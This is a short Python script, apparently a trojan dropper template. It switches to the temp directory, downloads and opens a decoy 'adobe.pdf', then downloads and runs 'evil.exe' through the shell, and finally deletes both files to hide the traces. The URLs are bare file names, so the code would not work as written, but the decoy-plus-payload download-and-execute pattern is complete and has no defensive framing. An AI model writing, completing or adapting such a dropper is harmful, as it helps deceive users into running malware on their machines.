import requests, subprocess, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, "wb") as f:
        f.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download('adobe.pdf')
subprocess.Popen('adobe.pdf', shell=True)

download('evil.exe')
subprocess.call('evil.exe', shell=True)

os.remove("adobe.pdf")
os.remove('evil.exe')
